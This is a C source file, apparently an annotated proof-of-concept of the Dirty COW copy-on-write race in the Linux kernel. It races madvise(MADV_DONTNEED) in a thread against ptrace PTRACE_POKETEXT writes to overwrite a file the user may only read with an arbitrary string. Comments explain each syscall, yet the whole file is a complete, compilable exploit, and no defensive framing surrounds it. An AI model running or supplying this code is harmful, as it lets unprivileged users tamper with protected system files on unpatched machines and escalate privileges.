// gcc -pthread exploit.c -o exploit

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;                  // file descriptor
void *map;              // memory map
pid_t pid;              // process id
pthread_t pth;          // thread
struct stat st;         // file_info

void *madviseThread(void *arg)
{
        int i, c = 0;

        /*
         * MADV_DONTNEED flag informs kernel that memory in the given range
         * (from the first parameter to the second one) will not be accessed
         * in the near future.
         *
         * After a successful MADV_DONTNEED operation, the semantics of memory
         * access in the specified region are changed. Subsequent accessses of
         * pages in the range will succeed, but will result in either:
         *
         *      - Repopulating the memory contents from the up-to-date contents
         *        of the underlying mapped file
         *      - zero-fill-on-demand pages for anonymous private mappings
         */

        for(i = 0; i < 200000000; i++)
                c += madvise(map, 100, MADV_DONTNEED);
	printf("madvise %d\n\n",c);
}

int main(int argc, char *argv[])
{
        if (argc < 3)
                return 1;

        f = open(argv[1], O_RDONLY);
        fstat(f, &st);  // retrieve file information

        // map opened file with MAP_PRIVATE
        map = mmap(
                NULL,
                st.st_size + sizeof(long),
                PROT_READ,
                MAP_PRIVATE, f, 0);

        /*
         * MAP_PRIVATE flag creates a private copy-on-write mapping.
         * Updates to this mapping are not visible to other processes that
         * use the same file, and are not applied to the underlying file.
         */

        printf("mmap %lx\n\n", (unsigned long) map);

        /*
         * fork() creates a new process by duplicating the calling process.
         * pid thus refers to the process id of child process.
         *
         * On success, the PID of the child process is returned in the parent,
         * and 0 is returned in the child. On failure, -1 is returned in the
         * parent, no child process is created.
         *
         * The technique used here resembles recursion.
         */

	pid = fork();

        if(pid) {

                /*
                 * waitpid() system call suspends execution of the calling process
                 * until a child specified by pid argument has changed state.
                 *
                 * When the third argument is 0, the calling process waits for
                 * any child process whose process group ID is equal to that of
                 * the calling process.
                 *
                 * In short, it waits for the child process.
                 */

                waitpid(pid, NULL, 0);

                int u, i, o, c = 0;
                int l = strlen(argv[2]);        // length of string argument

		// loop below keeps writing to the COW mapping of read-only file
                for(i = 0; i < 10000/l; i++) {
                        for(o = 0; o < l; o++) {
                                for(u = 0; u < 10000; u++) {
		/*
		 * PTRACE_POKETEXT copies data at the address pointed by the
		 * fourth argument to the address pointed by the third
		 * arguement (map + o).
		 */
                                        c += ptrace(
                                                PTRACE_POKETEXT,
                                                pid,
                                                map + o,
                                                *((long*)(argv[2]+o)));
                                }
                        }
                }
                printf("ptrace %d\n\n",c);
        } else {
		// loop that keeps reading the COW mapping of read-only file
                pthread_create(&pth, NULL, madviseThread, NULL);

                /*
                 * ptrace() system call provides a means by which one process
                 * may observe and control the execution of another process,
                 * and examine and change the tracee's memory and registers.
		 *
		 * PTRACE_TRACEME indicates that this process is to be traced
		 * by its parent.
		 *
		 * Parent and child processes run concurrently.
		 */

		ptrace(PTRACE_TRACEME);
                kill(getpid(), SIGSTOP);	// stop the child process
                pthread_join(pth, NULL);	// wait for madviseThread to terminate
        }

        return 0;
}
